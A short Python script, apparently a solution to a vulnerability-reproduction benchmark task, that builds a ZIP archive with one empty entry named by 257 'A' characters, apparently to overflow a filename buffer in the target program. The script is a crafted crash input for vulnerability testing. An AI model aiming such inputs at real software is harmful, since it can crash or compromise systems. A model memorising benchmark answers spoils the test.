import io
import zipfile
import time

class Solution:
    def solve(self, src_path: str) -> bytes:
        filename_length = 257
        long_filename = 'A' * filename_length

        buffer = io.BytesIO()
        with zipfile.ZipFile(buffer, 'w', zipfile.ZIP_STORED, allowZip64=False) as zf:
            zinfo = zipfile.ZipInfo(long_filename, date_time=time.localtime(0)[:6])
            zinfo.compress_type = zipfile.ZIP_STORED
            zinfo.external_attr = 0
            zinfo.extra = b''
            zf.writestr(zinfo, b'')

        return buffer.getvalue()